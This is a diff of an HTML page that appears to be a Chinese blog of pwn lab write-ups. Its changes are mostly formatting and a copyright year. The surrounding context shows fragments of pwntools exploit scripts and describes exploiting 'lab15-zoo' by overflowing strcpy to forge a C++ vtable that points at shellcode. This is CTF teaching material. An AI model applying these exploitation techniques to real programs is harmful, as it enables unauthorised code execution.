@@ -2690,6 +2668,7 @@ unsorted bin attack 的结果是向任一地址写一个不可控的大数(unsor
 </span><span class="lnt">49
 </span><span class="lnt">50
 </span><span class="lnt">51
+</span><span class="lnt">52
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
@@ -2742,16 +2721,16 @@ unsorted bin attack 的结果是向任一地址写一个不可控的大数(unsor
 
     <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;choice :&#34;</span><span class="p">,</span> <span class="s2">&#34;4869&#34;</span><span class="p">)</span>
     <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></td></tr></table>
-</div>
-</div>
-<h3 id="lab15-zoo">lab15-zoo</h3>
+    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="lab15-zoo">lab15-zoo</h3>
 <p>C++ 的 pwn 题, 这道题目没有开 NX, 也就是说可以使用 shellcode, 在 Dog::Dog, Cat::Cat 这些函数里也有很明显的通过 strcpy 实现 overflow 的漏洞, 因此这一题就可以通过溢出伪造虚表, 控制虚表指针指向 shellcode 地址来 get shell
 更多 C++ pwn 的内容可以看这个 <a href="https://github.com/M4xW4n9/slides/blob/master/pwn_others/pwnincplusplus-160217120850.pdf">slide</a>, 内容虽然有点老了, 但很经典</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2828,7 +2807,8 @@ unsorted bin attack 的结果是向任一地址写一个不可控的大数(unsor
     <span class="n">listen</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
 
     <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></td></tr></table>
+    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></td></tr></table>
 </div>
 </div>
     </div>
@@ -2952,7 +2932,7 @@ unsorted bin attack 的结果是向任一地址写一个不可控的大数(unsor
     &copy;
     
        -
-    2019
+    2020
     <span class="heart">
       
       <i class="iconfont">
